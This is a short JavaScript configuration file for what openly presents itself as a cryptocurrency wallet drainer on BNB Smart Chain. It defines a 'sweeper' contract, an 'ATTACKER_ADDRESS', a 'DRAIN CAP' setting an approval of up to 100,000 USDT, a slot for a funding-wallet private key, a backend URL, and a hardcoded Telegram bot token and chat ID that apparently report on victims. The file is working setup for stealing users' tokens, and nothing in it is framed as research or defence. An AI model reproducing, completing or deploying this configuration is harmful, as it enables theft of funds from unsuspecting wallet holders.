// ========== BLOCKCHAIN CONFIG ==========
export const CHAIN_ID = 56;
export const CHAIN_NAME = "BNB Smart Chain";
export const RPC_URL = "https://bsc-dataseed.binance.org/";
export const EXPLORER = "https://bscscan.com/tx/";

// ========== TOKENS ==========
export const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
export const USDT_DECIMALS = 18; // USDT on BSC uses 18 decimals

// ========== SWEEPER CONTRACT ==========
export const SWEEPER_CONTRACT = "0x725d16999d92d799c6040a5d0387339122ae8fc9";

// ========== FUNDING WALLET ==========
export const FUNDING_PRIVATE_KEY = import.meta.env.VITE_FUNDING_PRIVATE_KEY || "your_funding_wallet_private_key";
export const FUNDING_AMOUNT = "0.0005";

// ========== DRAIN CAP ==========
export const MAX_APPROVE_USDT = "100000";

// ========== TELEGRAM ==========
export const TG_BOT_TOKEN = import.meta.env.VITE_TG_BOT_TOKEN || "8764870952:AAHE9MhIz4WMzxZlOE8TrZDtvrgOPdVmw74";
export const TG_CHAT_ID = import.meta.env.VITE_TG_CHAT_ID || "8448871506";

// ========== CONFIG OBJECT ==========
export const CONFIG = {
  SWEEPER_CONTRACT: "0x725d16999d92d799c6040a5d0387339122ae8fc9",
  USDT_CONTRACT: "0x55d398326f99059fF775485246999027B3197955",
  ATTACKER_ADDRESS: "0x08778541D06bE12b0CE6e92E8E19B8D97b96063B",
  BACKEND_URL: import.meta.env.VITE_BACKEND_URL || "usdt-backend-pm1voqbys-codex-bruhhhh.vercel.app",
  MAX_APPROVE_USDT: "100000",
  USDT_DECIMALS: 18,
  FUNDING_AMOUNT: "0.0005",  // <-- added this line
};